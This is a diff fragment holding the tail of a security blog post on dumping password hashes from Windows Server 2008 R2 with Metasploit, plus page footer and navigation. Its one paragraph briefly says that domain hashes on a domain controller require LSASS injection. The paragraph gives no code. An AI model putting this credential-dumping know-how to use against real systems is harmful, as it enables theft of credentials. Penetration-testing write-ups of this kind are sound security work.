+<p>As Gavin points out in the comments, it is better to run the meterpreter script or post module to do hashdumping on systems. The only time this is not the case is when you are trying to get domain hashes on a domain controller. The registry does not store these hashes (as far as I know). So LSASS injection is the only route and you have to jump through the mentioned hoops.</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2011-05-16</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" data-title="Dumping Hashes on Win2k8 R2 x64 with Metasploit" data-via="mubix"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" data-title="Dumping Hashes on Win2k8 R2 x64 with Metasploit"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" data-title="Dumping Hashes on Win2k8 R2 x64 with Metasploit"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" data-title="Dumping Hashes on Win2k8 R2 x64 with Metasploit"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Evernote" data-sharer="evernote" data-url="https://malicious.link/posts/2011/2011-05-16-dumping-hashes-on-win2k8-r2-x64-with-metasploit/" data-title="Dumping Hashes on Win2k8 R2 x64 with Metasploit"><i class="fab fa-evernote fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/2011/2011-04-12-exploitable-mobile-app-challenge/" class="prev" rel="prev" title="Exploitable Mobile App Challenge"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Exploitable Mobile App Challenge</a>
+            <a href="/posts/2011/2011-05-30-remote-dll-injection-with-meterpreter/" class="next" rel="next" title="Remote DLL Injection with Meterpreter">Remote DLL Injection with Meterpreter<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2005 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/mubix" target="_blank">Rob Fuller</a></span>&nbsp;|&nbsp;<span class="license">All Rights Reserved</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":100},"comment":{},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
